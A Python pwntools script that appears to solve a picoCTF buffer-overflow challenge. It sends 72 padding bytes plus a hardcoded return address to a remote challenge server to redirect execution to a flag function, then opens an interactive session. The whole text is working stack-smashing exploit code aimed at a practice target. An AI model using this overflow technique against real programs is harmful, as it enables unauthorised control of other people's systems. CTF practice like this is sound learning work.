import pwn

elf = pwn.ELF("./vuln")

#flagadd = pwn.p64(elf.symbols['flag'])
flagadd = pwn.p64(0x000000000040123b)
#p = elf.process()
p = pwn.remote("saturn.picoctf.net", 57446)

payload = b"".join(
  [
    b"A"*72,
    flagadd
  ]
)

#payload += b"\n"

p.sendlineafter(b':',payload)
#p.recvuntil(b'?')
p.interactive()
